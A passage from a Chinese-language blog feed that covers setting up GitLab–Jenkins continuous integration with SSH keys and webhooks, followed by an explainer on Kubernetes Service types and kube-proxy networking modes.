AAAAB3NzaC1yc2EAAAADAQABAAABgQCrTMTf0oqtW7GktgZBdhqkjCBp2xGCcGeEo8ZcEKaN352TDMGKRI5O+0gAwUBj9HMAkPASJsejtTQIrT5jkBuW/8L5RXPDqCCyuzz1nkW/rPiyVvuAvvkQxFMBxL4w/AoDAhcsxpV73DCyYTrjQ8Tj7PfSViEUKZFpPbtroOZeCgCVa/mNPj7hGI2xUapKd0rdiGpXlDMPlD1uN9TET1WTj157QbYbgtsA6y+K2hjG97HHta0miovC4vqbaKQuohbYThbkwE5v6Ndjg8WSYjXEO6SDgemR6/c/JIyMPv1rNUitzl6dg4jykJ2pCTsemvFL7Vdjypbn9l0bPK8cq+mz0W8ZKLd2Ijqshj67SFWjFxJs0/yabg3jdMTdnYxRYdiG2vaMlAmtgGbXAUGXMqCzXNftmSpyqlSxGhfKLUC76LCqc4nBhqt2reN3L5yd/rzVZENdpok8cdV/dZag8ibzlgeqOL60ONThYTPZTACyw+U2K2HhqLmoCVDpYxU= root<span class="hljs-meta">@jenkins211</span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> 2.<strong>将公钥加入到gitlab</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d151e8f5f16c4650bd5a2135dfc61e60.png" alt="d151e8f5f16c4650bd5a2135dfc61e60.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>3.拉取测试</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># 随便拉一个位置测试就行</span><br>[root<span class="hljs-symbol">@jenkins211</span> ~]<span class="hljs-meta"># git clone git@10.0.0.212:ops/project.git</span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="五、-jenkins推送代码到gitlab"><a href="#五、-jenkins推送代码到gitlab" class="headerlink" title="五、 jenkins推送代码到gitlab"></a>五、 jenkins推送代码到gitlab</h2><p>1.jenkins创建项目</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/3bb3f56c2bbd4ab0a4d33b70589d33a6.png" alt="3bb3f56c2bbd4ab0a4d33b70589d33a6.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>2.填写git地址<img src="https://gitee.com/ljh00928/csdn/raw/master/img/9cd693ded1bf4da29b08b1ddab163628.png" alt="9cd693ded1bf4da29b08b1ddab163628.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> 3.jenkins构建</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/6caece5f65ef4edf9405091af52edf45.png" alt="6caece5f65ef4edf9405091af52edf45.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><blockquote><p> 构建完成之后，代码会拉取到jenkins工作目录中，在日志中查看工作目录的位置</p></blockquote><p> <img src="https://gitee.com/ljh00928/csdn/raw/master/img/860ce7b0d00f4b28b93dc091057d0fde.png" alt="860ce7b0d00f4b28b93dc091057d0fde.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> 服务器查看，代码已经成功拉取到jenkins工作目录。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@jenkins211 test]<span class="hljs-comment"># pwd</span><br>/var/lib/jenkins/workspace/test<br>[root@jenkins211 test]<span class="hljs-comment"># ll</span><br>total 228<br>drwxr-xr-x<span class="hljs-number"> 6 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 ./<br>drwxr-xr-x<span class="hljs-number"> 3 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 ../<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16458 </span>Dec<span class="hljs-number"> 17 </span>17:22 about.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 20149 </span>Dec<span class="hljs-number"> 17 </span>17:22 album.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 19662 </span>Dec<span class="hljs-number"> 17 </span>17:22 article_detail.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 18767 </span>Dec<span class="hljs-number"> 17 </span>17:22 article.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 18913 </span>Dec<span class="hljs-number"> 17 </span>17:22 comment.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16465 </span>Dec<span class="hljs-number"> 17 </span>17:22 contact.html<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 css/<br>drwxr-xr-x<span class="hljs-number"> 8 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 .git/<br>drwxr-xr-x<span class="hljs-number"> 5 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 images/<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 29627 </span>Dec<span class="hljs-number"> 17 </span>17:22 index.html<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 js/<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 24893 </span>Dec<span class="hljs-number"> 17 </span>17:22 product_detail.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 20672 </span>Dec<span class="hljs-number"> 17 </span>17:22 product.html<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>4.配置webhook</p><p>jenkins需要安装gitlab插件</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/52f75e68a66f45c98744132684c782c7.png" alt="52f75e68a66f45c98744132684c782c7.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> 勾选插件</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d1ffaa4591104bc0b6c840b5420990ce.png" alt="d1ffaa4591104bc0b6c840b5420990ce.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> jenkins生成令牌</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/58cc8d038daa445dbc23612a4e0bc49b.png" alt="58cc8d038daa445dbc23612a4e0bc49b.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> gitlab添加令牌，填写jenkins url</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/276546fd9ab44bb58382021626f3b884.png" alt="276546fd9ab44bb58382021626f3b884.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>gitlab测试钩子状态</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/962a11f4e4c1450d8cee1548aa69720a.png" alt="962a11f4e4c1450d8cee1548aa69720a.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="六、测试gitlab和jenkins持续集成"><a href="#六、测试gitlab和jenkins持续集成" class="headerlink" title="六、测试gitlab和jenkins持续集成"></a>六、测试gitlab和jenkins持续集成</h2><p>gitlab修改代码提交，这里我们直接加个p标签测试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">[root@gitlab212 project]# vim about.html<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> 第一次提交 <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;applicable-device&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;pc,mobile&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>关于我们<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>提交代码到gitlab</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">git <span class="hljs-keyword">add</span> .<br><br>git <span class="hljs-keyword">commit</span> <span class="hljs-operator">-</span>m ＂第一次提交&quot;<br><br>git push origin master<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>jenkins观察是否自动拉取，这时候jenkins检测到gitlab分支有变动，自动拉取代码到了jenkins工作目录中了~</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/81321be1610f45fd921b4341abf05b57.png" alt="81321be1610f45fd921b4341abf05b57.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml">[root@jenkins211 test]# cat about.html | head -10<br>?<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> 第一次提交 <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>]]></content>
    
    
    <categories>
      
      <category>cicd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cicd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>K8s 网络机制</title>
    <link href="/2025/04/15/K8s-%E7%BD%91%E7%BB%9C%E6%9C%BA%E5%88%B6/"/>
    <url>/2025/04/15/K8s-%E7%BD%91%E7%BB%9C%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Service 作为 K8s 中的一等公民，其承载了核心容器网络的访问管理能力，包括：</p><ul><li>暴露&#x2F;访问一组 Pod 的能力</li><li>Pod 访问集群内、集群外服务</li><li>集群外客户端访问集群内 Pod 的服务</li></ul><p>无论是作为应用的开发者还是使用者，一般都需要先经过 Service 才会访问到真正的目标 Pod。因此熟悉 Service 网络管理机制将会使我们更加深入理解 K8s 的容器编排原理，</p><p>本文将从 K8s 中容器网络、Service&#x2F;Pod 关联、Service 类型、kube-proxy 模式、Ingress 等方面，说明 Service 的网络机制。</p><h1 id="一、Service类型"><a href="#一、Service类型" class="headerlink" title="一、Service类型"></a>一、Service类型</h1><table><thead><tr><th>类型</th><th>应用场景</th></tr></thead><tbody><tr><td>CLusterIP</td><td>K8S集群内部相互访问</td></tr><tr><td>NodePort</td><td>K8S集群外部实现访问</td></tr><tr><td>LoadBalancer</td><td>云环境中使用，比如K8S在阿里云，腾讯云，京东云，华为云等。对应的云产品都有自己的负载均衡器产品</td></tr><tr><td>ExternerName</td><td>SVC代理的服务并不在K8S集群内部，而是在K8S集群外部</td></tr></tbody></table><p> <img src="https://gitee.com/ljh00928/csdn/raw/master/img/7dd7d9de57bd46bda0f4f2fba82e6ad5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="ClusterIP"><a href="#ClusterIP" class="headerlink" title="ClusterIP"></a>ClusterIP</h2><p>ClusterIP 表示在 K8s 集群内部通过 service.spec.clusterIP 进行访问，之后经过 kube-proxy 负载均衡到目标 Pod。</p><p>无头服务 (Headless Service)：<br> 当指定 Service 的 ClusterIP &#x3D; None 时，则创建的 Service 不会生成 ClusterIP，这样 Service 域名在解析的时候，将直接解析到对应的后端 Pod (一个或多个)，某些业务如果不想走 Service 默认的负载均衡，则可采用此种方式 直连 Pod。</p><blockquote><p>&#x2F;&#x2F; service.spec.publishNotReadyAddresses：表示是否将没有 ready 的 Pods 关联到 Service，默认为 false。设置此字段的主要场景是为 StatefulSet 的 Service 提供支持，使之能够为其 Pod 传播 SRV DNS 记录，以实现对等发现。</p></blockquote><p> 当没有指定 service.type 时，默认类型为 ClusterIP。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> <span class="hljs-params">v1kind:</span> <span class="hljs-params">Servicemetadata:</span>  <span class="hljs-params">name:</span> <span class="hljs-params">headless-servicespec:</span>  <span class="hljs-params">selector:</span>    <span class="hljs-params">app:</span> nginx  <span class="hljs-params">ports:</span>    <span class="hljs-operator">-</span> <span class="hljs-params">protocol:</span> TCP      <span class="hljs-params">port:</span> <span class="hljs-number">80</span>      <span class="hljs-params">targetPort:</span> <span class="hljs-number">80</span>  <span class="hljs-params">type:</span> ClusterIP <span class="hljs-comment"># 默认类型，可省略  clusterIP: None # 指定 ClusterIP = None  publishNotReadyAddresses: true # 是否关联未 ready pods</span><br></code></pre></td></tr></table></figure><h2 id="NodePort"><a href="#NodePort" class="headerlink" title="NodePort"></a>NodePort</h2><p>当业务需要从 K8s 集群外访问内部服务时，通过 NodePort 方式可以先将访问流量转发到对应的 Node IP，然后再通过 service.spec.ports[].nodePort 端口，通过 kube-proxy 负载均衡到目标 Pod。</p><blockquote><p>Service NodePort 默认端口范围：30000-32767，共 2768 个端口。<br> 可通过 kube-apiserver 组件的 <code>--service-node-port-range</code> 参数进行配置。</p><p>[root@master231 ~]# vim &#x2F;etc&#x2F;kubernetes&#x2F;manifests&#x2F;kube-apiserver.yaml<br> …<br> spec:<br>  containers:<br>  - command:<br>   - kube-apiserver<br>   - –service-node-port-range&#x3D;3000-50000  # 进行添加这一行即可</p></blockquote><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> <span class="hljs-params">v1kind:</span> <span class="hljs-params">Servicemetadata:</span>  <span class="hljs-params">name:</span> <span class="hljs-params">nodeport-servicespec:</span>  <span class="hljs-params">selector:</span>    <span class="hljs-params">app:</span> nginx  <span class="hljs-params">ports:</span>    <span class="hljs-operator">-</span> <span class="hljs-params">nodePort:</span> <span class="hljs-number">30800</span>   <span class="hljs-comment">#worker节点的端口映射      port: 8080        #对应的svc的port端口      protocol: TCP           targetPort: 80    #对应的pod端口  type: NodePort</span><br></code></pre></td></tr></table></figure><h2 id="LoadBalancer"><a href="#LoadBalancer" class="headerlink" title="LoadBalancer"></a><strong>LoadBalancer</strong></h2><p>上面的 NodePort 方式访问内部服务，需要依赖具体的 Node 高可用，如果节点挂了则会影响业务访问，LoadBalancer 可以解决此问题。</p><p>具体来说，LoadBalancer 类型的 Service 创建后，由具体是云厂商或用户实现 externalIP (service.status.loadBalancer) 的分配，业务直接通过访问 externalIP，然后负载均衡到目标 Pod。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> <span class="hljs-params">v1kind:</span> <span class="hljs-params">Servicemetadata:</span>  <span class="hljs-params">name:</span> <span class="hljs-params">my-servicespec:</span>  <span class="hljs-params">selector:</span>    app.kubernetes.io<span class="hljs-operator">/</span><span class="hljs-params">name:</span> MyApp  <span class="hljs-params">ports:</span>    <span class="hljs-operator">-</span> <span class="hljs-params">protocol:</span> TCP      <span class="hljs-params">nodePort:</span> <span class="hljs-number">30931</span>      <span class="hljs-params">port:</span> <span class="hljs-number">80</span>      <span class="hljs-params">targetPort:</span> <span class="hljs-number">9376</span>  <span class="hljs-params">clusterIP:</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">171.239</span>  <span class="hljs-params">type:</span> <span class="hljs-params">LoadBalancerstatus:</span>  <span class="hljs-params">loadBalancer:</span>    <span class="hljs-params">ingress:</span>    <span class="hljs-operator">-</span> <span class="hljs-params">ip:</span> <span class="hljs-number">192.0</span>.<span class="hljs-number">2.127</span><br></code></pre></td></tr></table></figure><h2 id="ExternalName"><a href="#ExternalName" class="headerlink" title="ExternalName"></a>ExternalName</h2><p>当业务需要从 K8s 内部访问外部服务的时候，可以通过 ExternalName 的方式实现。Demo 如下</p><p>具体来说，service.spec.externalName 字段值会被解析为 DNS 对应的 CNAME 记录，之后就可以访问到外部对应的服务了</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> <span class="hljs-params">v1kind:</span> Service  <span class="hljs-comment">#无selector，无endpointsmetadata:  name: my-service    namespace: prodspec:  type: ExternalName  externalName: my.database.example.com</span><br></code></pre></td></tr></table></figure><h1 id="二、容器网络机制"><a href="#二、容器网络机制" class="headerlink" title="二、容器网络机制"></a>二、容器网络机制</h1><p>K8s 将一组逻辑上紧密相关的容器，统一抽象为 Pod 概念，以共享 Pod Sandbox 的基础信息，如 Namespace 命名空间、IP 分配、Volume 存储（如 hostPath&#x2F;emptyDir&#x2F;PVC）等，因此讨论容器的网络访问机制，实际上可以用 Pod 访问机制代替。</p><p>根据 Pod 在集群内的分布情况，可将 Pod 的访问方式主要分为两种：</p><ul><li>同一个 Node 内 Pod 访问</li><li>跨 Node 间 Pod 访问</li></ul><h2 id="同一个-Node-内访问"><a href="#同一个-Node-内访问" class="headerlink" title="同一个 Node 内访问"></a>同一个 Node 内访问</h2><p>同一个 Node 内访问，表示两个或多个 Pod 落在同一个 Node 宿主机上，这种 Pod 彼此间访问将不会跨 Node，通过本机网络即可完成通信。</p><p>具体来说，Node 上的运行时如 Docker&#x2F;containerd 会在启动后创建默认的网桥 cbr0 (custom bridge)，以连接当前 Node 上管理的所有容器 (containers)。当 Pod 创建后，会在 Pod Sandbox 初始化基础网络时，调用 CNI bridge 插件创建 veth-pair（两张虚拟网卡），一张默认命名 eth0 (如果 hostNetwork &#x3D; false，则后续调用 CNI ipam 插件分配 IP)。另一张放在 Host 的 Root Network Namespace 内，然后连接到 cbr0。当 Pod 在同一个 Node 内通信访问的时候，直接通过 cbr0 即可完成网桥转发通信。</p><blockquote><p>访问流程：</p><ul><li>首先运行时如 Docker&#x2F;containerd 创建 cbr0；</li><li>Pod Sandbox 初始化调用 CNI bridge 插件创建 veth-pair（两张虚拟网卡）；</li><li>一张放在 Pod Sandbox 所在的 Network Namespace 内（CRI containerd 默认传的参数为 eth0）；</li><li>另一张放在 Host 的 Root Network Namespace 内，然后连接到 cbr0；</li><li>Pod 在同一个 Node 内访问直接通过 cbr0 网桥转发；</li></ul><p>&#x2F;&#x2F; docker中默认网桥名为docker 0，k8s中默认网桥名为cni 0</p></blockquote><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e61a893bdeb7451aad260b4a5e15fa91.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="跨-Node-间-Pod-访问"><a href="#跨-Node-间-Pod-访问" class="headerlink" title="跨 Node 间 Pod 访问"></a>跨 Node 间 Pod 访问</h2><p>跨 Node 间访问，Pod 访问流量通过 veth-pair 打到 cbr0，之后转发到宿主机 eth0，之后通过 Node 之间的路由表 Route Table 进行转发。到达目标 Node 后进行相同的过程，最终转发到目标 Pod 上。</p><blockquote><p>访问流程：</p><ul><li>用户访问某个 Pod 时，首先访问的是 Kubernetes 服务。</li><li>服务通过 kube-proxy 将请求转发到后端的 Pod。</li><li>由于服务是跨节点的，kube-proxy 会根据不同的访问策略（如 iptables 或 IPVS）选择后端的 Pod。如果 Pod 位于不同的节点，流量会通过节点之间的网络进行转发。</li></ul></blockquote><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/eb084beaad664485a2bd7de0f97c0d46.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h1 id="三、Service与Pod关系"><a href="#三、Service与Pod关系" class="headerlink" title="三、Service与Pod关系"></a>三、Service与Pod关系</h1><h2 id="Pod-的定义"><a href="#Pod-的定义" class="headerlink" title="Pod 的定义"></a>Pod 的定义</h2><p>Pod 是 Kubernetes 中最小的部署单位。Pod 中包含一个或多个容器（通常是单个容器）。这些容器共享同一个网络命名空间。</p><blockquote><p>特点：</p><ul><li>每个 Pod 会被 Kubernetes 分配一个 唯一的 IP 地址，这个 IP 地址仅在集群内部有效。</li><li>Pod 的生命周期是短暂的，一个 Pod 会随着应用的部署而创建，随着应用的销毁而被删除。</li><li>Pod 通常由 Deployment、StatefulSet 或 DaemonSet 等控制器进行管理，控制器负责确保</li><li>Pod 的数量和健康状态。</li></ul></blockquote><h2 id="Service-的定义"><a href="#Service-的定义" class="headerlink" title="Service 的定义"></a><strong>Service 的定义</strong></h2><p>Service 是一个抽象，它定义了一组具有相同功能的 Pod，并为这些 Pod 提供一个固定的访问入口。Pod 的 IP 地址是动态的，可能会因为 Pod 的重启或者节点的变动而变化，Service 通过对外提供一个稳定的访问接口来解决这个问题。 </p><blockquote><p>特点：</p><ul><li>ClusterIP：这是最常见的类型，它为 Service 分配一个虚拟 IP 地址，Pod 通过该 IP 地址暴露给其他 Pod 或客户端。</li><li>NodePort：在 ClusterIP 的基础上，Service 会在每个节点上开放一个静态端口，从而使服务可以通过 NodeIP:NodePort 进行访问。</li><li>LoadBalancer：在 NodePort 的基础上，Service 会向云提供商请求创建一个外部负载均衡器，从而为外部客户端提供访问。</li><li>Headless Service：如果没有为 Service 提供 ClusterIP（即 clusterIP: None），则 Service 仅提供一组 Pod 的 DNS 名称而没有虚拟 IP。这种类型常用于 StatefulSet 等需要稳定 DNS 的场景。</li></ul></blockquote><h2 id="两者之间关系"><a href="#两者之间关系" class="headerlink" title="两者之间关系"></a>两者之间关系</h2><p>Service 通过指定选择器 (selector) 去选择与目标 Pod 匹配的标签 (labels)，找到目标 Pod 后，建立对应的 Endpoints 对象。当感知到 Service&#x2F;Endpoints&#x2F;Pod 对象变化时，创建或更新 Service 对应的 Endpoints，使得 Service selector 与 Pod labels 始终达到匹配的状态。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a993fc7a1e934a389aa83b4fdc735b55.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h1 id="四、Kube-proxy多种模式"><a href="#四、Kube-proxy多种模式" class="headerlink" title="四、Kube-proxy多种模式"></a>四、Kube-proxy多种模式</h1><p> 在 Kubernetes 中，kube-proxy 是一种负责服务代理和负载均衡的关键组件，它允许 Kubernetes 集群中的 Pod 通过 Service 访问其他 Pod。kube-proxy 在多个网络模式下工作，控制流量如何从客户端发送到 Service 以及 Service 后端的 Pod。</p><p>Kubernetes 提供了三种 kube-proxy 的工作模式，每种模式使用不同的方式来管理流量的路由和负载均衡。以下是这三种模式的详细解释：</p><ul><li>Userspace 模式</li><li>iptables 模式</li><li>ipvs 模式</li></ul><h2 id="Userspace-模式"><a href="#Userspace-模式" class="headerlink" title="Userspace 模式"></a><strong>Userspace 模式</strong></h2><p>这是kube-proxy的最早版本，也是 Kubernetes 在早期版本中使用的默认模式，这里不多讲解，感兴趣小伙伴可以自行百度。</p><h2 id="iptables-模式"><a href="#iptables-模式" class="headerlink" title="iptables 模式"></a><strong>iptables 模式</strong></h2><p>K8s 中当前默认的 kube-proxy 模式，核心逻辑是使用 iptables 中 PREROUTING 链 nat 表，实现 Service &#x3D;&gt; Endpoints (Pod IP) 的负载均衡。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/1a22d7a413db450193c1e612fc587486.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><blockquote><p>工作原理：</p><ul><li>在 iptables 模式下，kube-proxy 会通过管理 iptables 规则来处理流量的路由。当客户端请求一个 Service 时，kube-proxy 会将流量重定向到后端的 Pod。每个 Service 在 iptables 中都有一条规则，客户端的请求会根据规则被路由到某个 Pod。</li><li>iptables 可以将请求直接转发到 Pod，而不需要经过用户空间进程，因此性能得到了显著提高。</li></ul></blockquote><h2 id="ipvs-模式"><a href="#ipvs-模式" class="headerlink" title="ipvs 模式"></a><strong>ipvs 模式</strong></h2><p>ipvs是 Linux 内核提供的一个虚拟服务器模块，专门用于高效的负载均衡。相比iptables，ipvs提供了更强大、灵活的负载均衡能力。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/dd08f07685384e34bc52763b4510bf37.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><blockquote><p>工作原理：</p><ul><li>在 ipvs 模式下，kube-proxy 使用ipvs来实现负载均衡。ipvs为每个 Service 